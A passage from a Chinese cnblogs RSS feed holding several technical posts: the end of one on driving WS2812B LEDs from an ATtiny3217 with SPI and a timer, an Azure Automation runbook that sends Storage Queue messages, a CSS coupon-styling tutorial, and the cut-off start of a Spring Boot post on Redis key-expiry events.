&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125232949529-394395293.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;两个字节之间有明显的间隔，这从代码里也能看出来。虽然间隔时间比实测最短的RESET时间9 μs还要短一半，但让我很不舒服。&lt;/p&gt;
&lt;p&gt;ATtiny3217的SPI有一个缓冲字节，利用它或许可以实现多个字节连续发送：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;void ws2812b_write(const uint8_t* byte, uint8_t length)
{
    TCA0.SINGLE.CNT = 3;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc | TCA_SINGLE_ENABLE_bm;
    SPI0.INTFLAGS |= SPI_TXCIF_bm;
    for (const uint8_t* end = byte + length; byte != end; ++byte)
    {
        while (!(SPI0.INTFLAGS &amp;amp; SPI_DREIE_bm))
            ;
        SPI0.DATA = *byte;
    }
    while (!(SPI0.INTFLAGS &amp;amp; SPI_TXCIF_bm))
        ;
    TCA0.SINGLE.CTRLA = TCA_SINGLE_CLKSEL_DIV1_gc;
    TCA0.SINGLE.CTRLC = 0;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;记得在&lt;a href=&quot;http://www.cnblogs.com/jerry-fuyi/archive/2020/02/08/12259153.html&quot; target=&quot;_blank&quot;&gt;AVR单片机教程——DAC&lt;/a&gt;中，USART in SPI mode的缓冲区一方面让我要额外注意每次都要把&lt;code&gt;UDR0&lt;/code&gt;读掉以获得新鲜的数据，另一方面在我需要连续发送两个字节时相比SPI更节省CPU资源，让我得以实现音乐播放器。如果要在编程简单和功能强大之间选择的话，我还是会选择后者。那么这次ATtiny3217的SPI缓冲区能否让它胜任WS2812B的连续发送呢？让我们来看看波形：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125234337308-192786703.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;前两行很符合预期——&lt;code&gt;SCK&lt;/code&gt;信号没有出现间断。加入第三行，密集的线条可能迷惑了你的双眼，但是第四行足够明显——第一字节的输出是正常的，但是第二字节就不对了。究其原因，是第二字节的第一个&lt;code&gt;SCK&lt;/code&gt;上升沿出现在它本来应该对应的&lt;code&gt;WO2&lt;/code&gt;上升沿和它后面的下降沿中间，换言之&lt;code&gt;SCK&lt;/code&gt;滞后了。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210125234600969-2108311676.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;继续向后观察，第3、4、5字节都貌似正常，第6字节又出错了。仔细观察，第3字节像是下降沿对齐的PWM信号，而第4字节是高电平中心对齐的（center-aligned）。以4字节为周期，后面重复。事实上，每两字节之间&lt;code&gt;SCK&lt;/code&gt;低电平延长了2个CPU周期，相当于&lt;code&gt;WO2&lt;/code&gt;信号的90°相位差；这样周期为4字节就很好理解了。&lt;/p&gt;
&lt;p&gt;所以，以让我开心为目的的改进失败了。&lt;/p&gt;
&lt;h3 id=&quot;讨论&quot;&gt;讨论&lt;/h3&gt;
&lt;h4 id=&quot;tca与spi的同步&quot;&gt;TCA与SPI的同步&lt;/h4&gt;
&lt;p&gt;如果你仔细看代码的话，应该是无法理解&lt;code&gt;TCA0.SINGLE.CNT = 3;&lt;/code&gt;中的magic number的。的确，这个数是我一点点改直到&lt;code&gt;SCK&lt;/code&gt;和&lt;code&gt;WO2&lt;/code&gt;上升沿对齐这样试出来的。如果把&lt;code&gt;SPI0.INTFLAGS |= SPI_TXCIF_bm;&lt;/code&gt;这一句移到前面去，这个数就得改成&lt;code&gt;7&lt;/code&gt;——这说明移的那句需要4个周期来执行。&lt;/p&gt;
&lt;p&gt;同理，改进前的&lt;code&gt;TCA0.SINGLE.CNT = 0;&lt;/code&gt;也只是一个巧合，而不是像application note上说的那样：&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;Since there is no synchronization between the TCA output and the SPI clock, it is necessary to start and stop the TCA each time data is sent to the LEDs. It is also necessary to clear the TCA CNT register before TCA is started. This is done to make sure that the TCA starts counting from &lt;strong&gt;zero&lt;/strong&gt; each time the LEDs are updated.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;很显然，这样做是低效的、不安全的：低效在这个magic number需要花工夫去找，不安全在也许改变一下编译器的优化等级就能让你花的工夫作废。&lt;/p&gt;
&lt;h4 id=&quot;另一种逻辑&quot;&gt;另一种逻辑&lt;/h4&gt;
&lt;p&gt;老版本WS2812B的时序可以大致理解为1/3和2/3的高电平占比，而上述方案只能实现分母为4的占比。不过就&lt;code&gt;1&lt;/code&gt;而言，3/4比1/2更接近2/3，要做到3/4也只需要把&lt;code&gt;IN[2:0] = 0b110&lt;/code&gt;对应的输出改成&lt;code&gt;1&lt;/code&gt;就可以了。为什么application note不是这样做的呢？&lt;/p&gt;
&lt;p&gt;在1/2的方案中，只要&lt;code&gt;SCK&lt;/code&gt;为低电平，输出就是低电平；&lt;code&gt;SCK&lt;/code&gt;的闲时电平是SPI mode能完全确定的，因而能保证输出的闲时电平为低。在3/4的方案中，三输入的组合逻辑可以理解为输入有至少两个高电平时输出为高（提问：哪款常见的逻辑IC能实现这样的功能？）；那么如果数据的LSB为&lt;code&gt;1&lt;/code&gt;，输出就完全跟着&lt;code&gt;WO2&lt;/code&gt;走。而&lt;code&gt;WO2&lt;/code&gt;在SPI发送完后还有一段高电平，除非这一段能被消除，否则3/4方案就是不可行的。&lt;/p&gt;
&lt;p&gt;那么如何消除呢？也可以像上面那样搞个magic number，开始发送后等待这么多个周期，然后关闭TCA输出。这个数只要在一个[n, n+3]的区间里即可，没那么严格。但是，一旦主频改变，重新找吧！&lt;/p&gt;
&lt;h4 id=&quot;io分配与占用&quot;&gt;IO分配与占用&lt;/h4&gt;
&lt;p&gt;我开了&lt;code&gt;SCK&lt;/code&gt;等信号的输出，是为了看波形，如果不开，那个引脚还可以用吗？输出是不行的，一旦&lt;code&gt;DIR&lt;/code&gt;位为&lt;code&gt;1&lt;/code&gt;，它输出的就是&lt;code&gt;SCK&lt;/code&gt;信号；输入或许可以。&lt;/p&gt;
&lt;p&gt;所以，尽管我只需要&lt;code&gt;SCK&lt;/code&gt;信号在内部使用，它却必须占用一个引脚，这好吗？ATtiny3217一共只有24个pin，尽管有alternative pins，但毕竟总数摆在这，挺容易冲突的。不知Microchip的工程师有没有思考过这个问题，还是说tiny系列的应用场景连24 pins都已经嫌多了？或许吧，虽然我舍不得。&lt;/p&gt;
&lt;p&gt;那么如何安排引脚呢？&lt;a href=&quot;https://start.atmel.com/&quot; target=&quot;_blank&quot;&gt;Atmel START&lt;/a&gt;是一个在线的工具，帮助你配置引脚、时钟和各种组件，就像隔壁厂家的某立方体一样。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/1734552/202101/1734552-20210126010622207-776224484.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;后记&quot;&gt;后记&lt;/h3&gt;
&lt;p&gt;最近在做一个涉及WS2812B灯带的项目。为了锻炼自己，我要把整个写级联WS2812B的操作做成无需CPU干预的，这当然离不开DMA。我在网上找到&lt;a href=&quot;http://www.martinhubacek.cz/arm/improved-stm32-ws2812b-library&quot; target=&quot;_blank&quot;&gt;三种方案&lt;/a&gt;，但它们都有严重的内存overhead，以至于很难把整个灯带的数据在一次DMA请求中发送出去，至少不划算。&lt;/p&gt;
&lt;p&gt;本文的方案则不存在这样的问题，因为WS2812B的一个字节就对应SPI的一个字节。但是TCA与SPI的同步和&lt;code&gt;SCK&lt;/code&gt;信号在字节间被延长，尤其是后者，给我浇了一盆冷水。我还没有验证这种方案，但大概率是不行的，好在我还有别的方案。&lt;/p&gt;
&lt;p&gt;你有什么方案吗？欢迎在评论区留言。&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Mon, 25 Jan 2021 17:32:00 +0000</pubDate>
<dc:creator>jerry_fuyi</dc:creator>
<og:description>新款AVR单片机ATtiny3217，能用CCL实现SPI的MOSI、SCK和定时器输出的组合逻辑，直接点亮单线协议的RGB灯WS2812B——没有外部器件！</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jerry-fuyi/p/14320712.html</dc:identifier>
</item>
<item>
<title>使用Azure Runbook 发送消息到Azure Storage Queue - 老王717</title>
<link>http://www.cnblogs.com/sharepointonline/p/14311383.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/sharepointonline/p/14311383.html</guid>
<description>&lt;p&gt;客户需要定时发送信息到Azure Storage Queue，所以尝试使用Azure Runbook实现这个需求。&lt;/p&gt;
&lt;p&gt;首先新增一个Azure Automation Account的资源。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/367039/202101/367039-20210125234923749-1430589688.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;因为要使用Az.storage模组发送消息到Queue, 但是这个模组并没有包含在默认模组中，所以要手动添加一下。选择 Shared resources 下面的 Modules gallery.&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/367039/202101/367039-20210125235247929-1802651087.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;因为Az.Storage依赖Az.Accounts模组，所以我们先搜索Az.Accounts, 找到后，双击打开新窗口，点击Import。导入大概需要几分钟，导入成功后，我们重复同样的步骤添加Az.Storage模组。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/367039/202101/367039-20210125235733944-478409984.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 都添加成功后，我们就可以添加我们的Runbook了&lt;/p&gt;
&lt;p&gt;从左边的菜单栏选择Runbooks，然后Create a runbook, 输入名字，选择类型Powershell&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/367039/202101/367039-20210125235041330-499973572.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 具体的powershell脚本如下&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;$connectionName&lt;/span&gt; = &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;AzureRunAsConnection&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;

&lt;span&gt;$servicePrincipalConnection&lt;/span&gt;=Get-AutomationConnection -Name &lt;span&gt;$connectionName&lt;/span&gt;&lt;span&gt; 

Write&lt;/span&gt;-Output(&lt;span&gt;$servicePrincipalConnection&lt;/span&gt;&lt;span&gt;.TenantId)
 &lt;br/&gt;Connect&lt;/span&gt;-&lt;span&gt;AzAccount `
        &lt;/span&gt;-&lt;span&gt;ServicePrincipal `
        &lt;/span&gt;-Tenant &lt;span&gt;$servicePrincipalConnection&lt;/span&gt;&lt;span&gt;.TenantId `
        &lt;/span&gt;-ApplicationId &lt;span&gt;$servicePrincipalConnection&lt;/span&gt;&lt;span&gt;.ApplicationId `
        &lt;/span&gt;-CertificateThumbprint &lt;span&gt;$servicePrincipalConnection&lt;/span&gt;&lt;span&gt;.CertificateThumbprint 
&lt;/span&gt;&lt;span&gt;$storageAccount&lt;/span&gt;=Get-AzStorageAccount -ResourceGroupName &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;******&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; -StorageAccountName &lt;span&gt;&quot;********&lt;/span&gt;&lt;span&gt;&quot;  #这里输入你自己的resource group名字和storage account的名字。&lt;/span&gt;
&lt;span&gt;$ctx&lt;/span&gt;=&lt;span&gt;$storageAccount&lt;/span&gt;&lt;span&gt;.Context
&lt;/span&gt;&lt;span&gt;$queue&lt;/span&gt;=Get-AzStorageQueue -Name &lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;test-spfx&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt; -Context &lt;span&gt;$ctx&lt;/span&gt;

&lt;span&gt;$queueMessage&lt;/span&gt; = [Microsoft.Azure.Storage.Queue.CloudQueueMessage]::new(&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;This is message from runbook&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;)
&lt;/span&gt;&lt;span&gt;$queue&lt;/span&gt;.CloudQueue.AddMessageAsync(&lt;span&gt;$QueueMessage&lt;/span&gt;&lt;span&gt;)
Write&lt;/span&gt;-Output (&lt;span&gt;&quot;&lt;/span&gt;&lt;span&gt;Send message to queue.&lt;/span&gt;&lt;span&gt;&quot;&lt;/span&gt;)
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这里的AzureRunAsConnection是使用的资源组默认样例的参数，可以根据自己的实际需要修改或添加。具体位置是在Shared Resources下面的Connections&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/367039/202101/367039-20210126000851629-681955873.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;最后可以测试runbook，去storage account下面检查，是否成功接收到消息。&lt;/p&gt;
</description>
<pubDate>Mon, 25 Jan 2021 16:11:00 +0000</pubDate>
<dc:creator>老王717</dc:creator>
<og:description>客户需要定时发送信息到Azure Storage Queue，所以尝试使用Azure Runbook实现这个需求。 首先新增一个Azure Automation Account的资源。 因为要使用Az</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/sharepointonline/p/14311383.html</dc:identifier>
</item>
<item>
<title>CSS不用背景图片实现优惠券样式反圆角,凹圆角,反向半圆角,并且背景渐变 - 帅帅的小毛驴</title>
<link>http://www.cnblogs.com/donkeysmall/p/14326213.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/donkeysmall/p/14326213.html</guid>
<description>&lt;p&gt;    日常开发过程中，特别是商城相关应用开发过程中，时常会遇到花里胡哨的设计图，比如优惠券样式，上图：&lt;/p&gt;
&lt;p&gt;    &lt;img src=&quot;https://img2020.cnblogs.com/blog/983493/202101/983493-20210125154144123-1520556362.png&quot; alt=&quot;&quot; width=&quot;652&quot; height=&quot;115&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;    实现思路如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;    1.先写一个外容器，实现背景色渐变：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Html：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;coupon&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt; &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    Css：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;.coupon &lt;/span&gt;{
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;      width&lt;/span&gt;:&lt;span&gt; 600px&lt;/span&gt;;
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;      height&lt;/span&gt;:&lt;span&gt; 110px&lt;/span&gt;; 
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;      background&lt;/span&gt;:&lt;span&gt; -webkit-linear-gradient(left, #d34b5a, #c64765)&lt;/span&gt;;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;      background&lt;/span&gt;:&lt;span&gt; -o-linear-gradient(left, #d34b5a, #c64765)&lt;/span&gt;;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;      background&lt;/span&gt;:&lt;span&gt; -moz-linear-gradient(left, #d34b5a, #c64765)&lt;/span&gt;;
&lt;span&gt; 7&lt;/span&gt; &lt;span&gt;      border-radius&lt;/span&gt;:&lt;span&gt; 16px&lt;/span&gt;;
&lt;span&gt; 8&lt;/span&gt; &lt;span&gt;      display&lt;/span&gt;:&lt;span&gt; flex&lt;/span&gt;;
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;      flex-direction&lt;/span&gt;:&lt;span&gt; row&lt;/span&gt;;
&lt;span&gt;10&lt;/span&gt; }
&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;    效果：&lt;/p&gt;
&lt;p&gt;    &lt;img src=&quot;https://img2020.cnblogs.com/blog/983493/202101/983493-20210125230014167-738559483.png&quot; alt=&quot;&quot; width=&quot;651&quot; height=&quot;132&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;    2.里面写左右两个容器，分别放置文本和按钮：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    Html：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;34&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;coupon&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;2&lt;/span&gt;     &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;coupon_text&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;3&lt;/span&gt;         优惠券&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;text&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;￥20&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;text&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;4&lt;/span&gt;         &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;使用期限：2021.01.21-2021.02.21&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;5&lt;/span&gt;     &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;6&lt;/span&gt;     &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;div &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;coupon_btn&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;7&lt;/span&gt;         &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;立即领取&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;span&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;8&lt;/span&gt;     &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;9&lt;/span&gt; &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;div&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    Css：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt; 1&lt;/span&gt; &lt;span&gt;.coupon_text &lt;/span&gt;{
&lt;span&gt; 2&lt;/span&gt; &lt;span&gt;      flex&lt;/span&gt;:&lt;span&gt; 1&lt;/span&gt;;
&lt;span&gt; 3&lt;/span&gt; &lt;span&gt;      color&lt;/span&gt;:&lt;span&gt; white&lt;/span&gt;;
&lt;span&gt; 4&lt;/span&gt; &lt;span&gt;      padding&lt;/span&gt;:&lt;span&gt; 25px 30px 20px 40px&lt;/span&gt;;
&lt;span&gt; 5&lt;/span&gt; &lt;span&gt;      font-size&lt;/span&gt;:&lt;span&gt; 20px&lt;/span&gt;;
&lt;span&gt; 6&lt;/span&gt; &lt;span&gt;      position&lt;/span&gt;:&lt;span&gt; relative&lt;/span&gt;;
&lt;span&gt; 7&lt;/span&gt; }
&lt;span&gt; 8&lt;/span&gt; 
&lt;span&gt; 9&lt;/span&gt; &lt;span&gt;      .coupon_text &amp;gt; b &lt;/span&gt;{
&lt;span&gt;10&lt;/span&gt; &lt;span&gt;            font-size&lt;/span&gt;:&lt;span&gt; 30px&lt;/span&gt;;
&lt;span&gt;11&lt;/span&gt;       }
&lt;span&gt;12&lt;/span&gt; 
&lt;span&gt;13&lt;/span&gt; &lt;span&gt;      .coupon_text &amp;gt; div &lt;/span&gt;{
&lt;span&gt;14&lt;/span&gt; &lt;span&gt;            font-size&lt;/span&gt;:&lt;span&gt; 15px&lt;/span&gt;;
&lt;span&gt;15&lt;/span&gt;       }
&lt;span&gt;16&lt;/span&gt; 
&lt;span&gt;17&lt;/span&gt; &lt;span&gt;.coupon_btn &lt;/span&gt;{
&lt;span&gt;18&lt;/span&gt; &lt;span&gt;      border&lt;/span&gt;:&lt;span&gt; none&lt;/span&gt;;
&lt;span&gt;19&lt;/span&gt; &lt;span&gt;      height&lt;/span&gt;:&lt;span&gt; 110px&lt;/span&gt;;
&lt;span&gt;20&lt;/span&gt; &lt;span&gt;      line-height&lt;/span&gt;:&lt;span&gt; 110px&lt;/span&gt;;
&lt;span&gt;21&lt;/span&gt; &lt;span&gt;      padding&lt;/span&gt;:&lt;span&gt; 0 40px&lt;/span&gt;;
&lt;span&gt;22&lt;/span&gt; }
&lt;span&gt;23&lt;/span&gt; 
&lt;span&gt;24&lt;/span&gt; &lt;span&gt;      .coupon_btn &amp;gt; span &lt;/span&gt;{
&lt;span&gt;25&lt;/span&gt; &lt;span&gt;            background&lt;/span&gt;:&lt;span&gt; -webkit-linear-gradient(top, #fae8e9, #f2a799)&lt;/span&gt;;
&lt;span&gt;26&lt;/span&gt; &lt;span&gt;            background&lt;/span&gt;:&lt;span&gt; -o-linear-gradient(top, #fae8e9, #f2a799)&lt;/span&gt;;
&lt;span&gt;27&lt;/span&gt; &lt;span&gt;            background&lt;/span&gt;:&lt;span&gt; -moz-linear-gradient(top, #fae8e9, #f2a799)&lt;/span&gt;;
&lt;span&gt;28&lt;/span&gt; &lt;span&gt;            padding&lt;/span&gt;:&lt;span&gt; 10px 20px&lt;/span&gt;;
&lt;span&gt;29&lt;/span&gt; &lt;span&gt;            vertical-align&lt;/span&gt;:&lt;span&gt; middle&lt;/span&gt;;
&lt;span&gt;30&lt;/span&gt; &lt;span&gt;            font-size&lt;/span&gt;:&lt;span&gt; 24px&lt;/span&gt;;
&lt;span&gt;31&lt;/span&gt; &lt;span&gt;            border-radius&lt;/span&gt;:&lt;span&gt; 30px&lt;/span&gt;;
&lt;span&gt;32&lt;/span&gt; &lt;span&gt;            color&lt;/span&gt;:&lt;span&gt; #E41F19&lt;/span&gt;;
&lt;span&gt;33&lt;/span&gt; 　　　　}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/983493/202101/983493-20210125231915402-619033676.png&quot; alt=&quot;&quot; width=&quot;662&quot; height=&quot;138&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;   3.画圆角和虚线：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;    我们在 .coupon_text 样式里添加css代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;41&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;      background-image: radial-gradient(circle at right top, #fff, #fff 15px, transparent 16px), &lt;br/&gt;radial-gradient(circle at right bottom, #fff, #fff 15px, transparent 16px);
&lt;/span&gt;&lt;span&gt;2&lt;/span&gt; &lt;span&gt;      border-right: 1px dashed #FFF;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    再在 .coupon_btn 样式里添加如下代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;40&quot;&gt;
&lt;pre&gt;
&lt;span&gt;1&lt;/span&gt; &lt;span&gt;      background-image: radial-gradient(circle at left top, #fff, #fff 15px, transparent 16px), &lt;br/&gt;radial-gradient(circle at left bottom, #fff, #fff 15px, transparent 16px);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;    查看效果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/983493/202101/983493-20210125233659102-2066193615.png&quot; alt=&quot;&quot; width=&quot;667&quot; height=&quot;137&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;    这个……好像和想象中有点不一样呀，不仅有白色的虚线，为啥还有红色的虚线呢？&lt;/p&gt;
&lt;p&gt;    那是因为前面我们外层class为coupon的div，设置了背景色，上层div的边框在虚线的地方是透明的，所以会间断显示红色背景，就成为我们看到的红色虚线了；&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;    在这里提供一个&lt;span&gt;逼死强迫症&lt;/span&gt;的解决方案：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;    &lt;span&gt;把class为coupon_btn的div，向左移动1px；将那根背景为红色的虚线挡住就行了。&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;32&quot;&gt;
&lt;pre&gt;
&lt;span&gt;.coupon_text &lt;/span&gt;{&lt;span&gt;
      margin-right&lt;/span&gt;:&lt;span&gt; -1px&lt;/span&gt;;
}

&lt;span&gt;/*&lt;/span&gt;&lt;span&gt; 或者 &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;&lt;span&gt;

.coupon_btn &lt;/span&gt;{&lt;span&gt;
      margin-left&lt;/span&gt;:&lt;span&gt; -1px&lt;/span&gt;;
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;    即可看到我们想要的效果：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/983493/202101/983493-20210125232758622-1260758035.png&quot; alt=&quot;&quot; width=&quot;668&quot; height=&quot;138&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;span&gt;    当然，实现上述设计图的方法有很多，欢迎交流~&lt;/span&gt;&lt;/strong&gt;&lt;/p&gt;


&lt;p&gt;    OK，搞定收工，拿碗排队打饭！&lt;/p&gt;

&lt;p&gt;    如果有帮助到你，可以的话请帮我点个赞吧，谢谢~&lt;/p&gt;


</description>
<pubDate>Mon, 25 Jan 2021 15:47:00 +0000</pubDate>
<dc:creator>帅帅的小毛驴</dc:creator>
<og:description>日常开发过程中，特别是商城相关应用开发过程中，时常会遇到花里胡哨的设计图，比如优惠券样式，上图： 实现思路如下： 1.先写一个外容器，实现背景色渐变： Html： 1 &amp;lt;div class=&amp;q</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/donkeysmall/p/14326213.html</dc:identifier>
</item>
<item>
<title>【Redis系列】Spring boot实现监听Redis key失效事件 - 抱明月而长终</title>
<link>http://www.cnblogs.com/tanpenggood/p/14328096.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/tanpenggood/p/14328096.html</guid>
<description>&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;talk is cheap, show me the code.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;一、开启redis-key过期提醒&quot;&gt;一、开启Redis key过期提醒&lt;/h2&gt;
&lt;ul readability=&quot;1&quot;&gt;&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;方式二：修改配置文件&lt;/p&gt;
&lt;p&gt;&lt;code&gt;redis.conf&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;# 默认 notify-keyspace-events &quot;&quot;
notify-keyspace-events Ex
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;li readability=&quot;1&quot;&gt;
&lt;p&gt;方式二：命令行开启&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;CONFIG SET notify-keyspace-events Ex
CONFIG GET notify-keyspace-events
&lt;/code&gt;
&lt;/pre&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;二、notify-keyspace-events&quot;&gt;二、notify-keyspace-events&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;notify-keyspace-events 选项的默认值为空&lt;/strong&gt;&lt;/p&gt;
